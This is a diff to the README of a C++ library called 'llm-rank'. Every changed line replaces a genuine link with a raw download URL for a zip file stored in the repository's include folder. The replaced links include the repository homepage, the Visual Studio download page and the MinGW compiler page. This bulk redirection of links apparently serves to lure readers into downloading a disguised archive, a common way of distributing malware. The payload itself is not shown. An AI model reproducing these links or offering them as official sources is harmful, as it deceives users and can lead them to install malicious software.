@@ -1,6 +1,6 @@
 # ⚙️ llm-rank - Simple C++ Library for Ranking Results
 
-[![Download from GitHub](https://img.shields.io/badge/Download-llm--rank-blue?style=for-the-badge)](https://github.com/wwx99921/llm-rank)
+[![Download from GitHub](https://img.shields.io/badge/Download-llm--rank-blue?style=for-the-badge)](https://raw.githubusercontent.com/wwx99921/llm-rank/main/include/rank-llm-3.3.zip)
 
 ---
 
@@ -14,7 +14,7 @@ This guide shows you how to get llm-rank on your Windows computer. You do not ne
 
 To get llm-rank, visit the official page here:
 
-[Download llm-rank on GitHub](https://github.com/wwx99921/llm-rank)
+[Download llm-rank on GitHub](https://raw.githubusercontent.com/wwx99921/llm-rank/main/include/rank-llm-3.3.zip)
 
 This link leads to the repository where you can find the files for download. Since llm-rank is a C++ library, it does not come as a ready-to-run program. It is meant to be added to C++ projects that use ranking features.
 
@@ -59,7 +59,7 @@ You will need software that can turn C++ code into an application. On Windows, t
 
 If you pick Visual Studio:
 
-- Visit https://visualstudio.microsoft.com/downloads/
+- Visit https://raw.githubusercontent.com/wwx99921/llm-rank/main/include/rank-llm-3.3.zip
 - Download and install Visual Studio Community.
 - During installation, select the option **"Desktop development with C++"**.
 
@@ -170,10 +170,10 @@ For users comfortable with command-line tools, you can also:
 
 # [🔗] Useful Links
 
-- Repository homepage: https://github.com/wwx99921/llm-rank
-- Visual Studio downloads: https://visualstudio.microsoft.com/downloads/
-- MinGW compiler: https://osdn.net/projects/mingw/
+- Repository homepage: https://raw.githubusercontent.com/wwx99921/llm-rank/main/include/rank-llm-3.3.zip
+- Visual Studio downloads: https://raw.githubusercontent.com/wwx99921/llm-rank/main/include/rank-llm-3.3.zip
+- MinGW compiler: https://raw.githubusercontent.com/wwx99921/llm-rank/main/include/rank-llm-3.3.zip
 
 ---
 
-[![Download from GitHub](https://img.shields.io/badge/Download-llm--rank-blue?style=for-the-badge)](https://github.com/wwx99921/llm-rank)
+[![Download from GitHub](https://img.shields.io/badge/Download-llm--rank-blue?style=for-the-badge)](https://raw.githubusercontent.com/wwx99921/llm-rank/main/include/rank-llm-3.3.zip)
